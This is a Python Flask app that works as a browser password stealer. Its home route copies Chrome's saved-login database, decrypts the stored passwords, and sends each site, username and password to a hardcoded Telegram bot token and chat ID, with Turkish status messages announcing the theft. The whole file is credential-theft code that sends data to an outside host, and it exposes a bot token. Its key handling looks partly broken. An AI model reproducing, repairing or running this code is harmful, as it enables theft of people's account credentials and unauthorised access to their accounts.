# app.py
from flask import Flask
import telebot
import os
import sqlite3
import shutil
import json
import base64
import time
import platform

app = Flask(__name__)
bot = telebot.TeleBot("8258388271:AAEr5lwYGZppBtSRy-c3wXCWu4Dr_GwASfI")
CHAT_ID = 7323434112

def get_paths():
    system = platform.system()
    base = os.path.expanduser("~")
    if system == "Windows":
        return [os.path.join(base, "AppData/Local/Google/Chrome/User Data/Default/Login Data")]
    elif system == "Linux":
        return [os.path.join(base, ".config/google-chrome/Default/Login Data")]
    elif system == "Darwin":  # Mac
        return [os.path.join(base, "Library/Application Support/Google/Chrome/Default/Login Data")]
    return []

def get_master_key(local_state):
    with open(local_state, 'r', encoding='utf-8') as f:
        ls = json.load(f)
    enc_key = base64.b64decode(ls["os_crypt"]["encrypted_key"])[5:]
    return enc_key

def decrypt_aes(key, encrypted):
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        iv = encrypted[3:15]
        ciphertext = encrypted[15:]
        cipher = Cipher(algorithms.AES(key), modes.GCM(iv))
        decryptor = cipher.decryptor()
        return (decryptor.update(ciphertext) + decryptor.finalize()).decode('utf-8', errors='ignore')
    except Exception as e:
        return f"[Decrypt hata: {e}]"

@app.route('/')
def home():
    bot.send_message(CHAT_ID, "REİS, PC CHROME ŞİFRELERİ ÇEKİLİYOR... 🔑")
    paths = get_paths()
    sifreler = []
    found = False
    for db_path in paths:
        if not os.path.exists(db_path):
            continue
        found = True
        local_state = db_path.replace("Login Data", "Local State")
        if not os.path.exists(local_state):
            continue
        try:
            key = get_master_key(local_state)
            shutil.copy(db_path, "temp.db")
            conn = sqlite3.connect("temp.db")
            cur = conn.cursor()
            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
            for url, user, enc in cur.fetchall():
                pwd = decrypt_aes(key, enc)
                sifreler.append(f"Site: {url}\nUser: {user}\nPass: {pwd}")
            conn.close()
            os.remove("temp.db")
        except Exception as e:
            sifreler.append(f"Hata: {e}")
    
    if not found:
        bot.send_message(CHAT_ID, "Chrome yolu bulunamadı. Chrome kurulu mu?")
    elif not sifreler:
        bot.send_message(CHAT_ID, "Şifre yok veya Chrome kapalı değil. Kapatıp tekrar dene.")
    else:
        for sifre in sifreler:
            bot.send_message(CHAT_ID, sifre)
            time.sleep(0.5)
        bot.send_message(CHAT_ID, f"✅ {len(sifreler)} ŞİFRE GÖNDERİLDİ! (25 olmalı)")

    return "<h1>ŞİFRELER TELEGRAM'DA REİS!</h1><p>Chrome'u kapatıp tekrar dene eğer hata varsa.</p>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
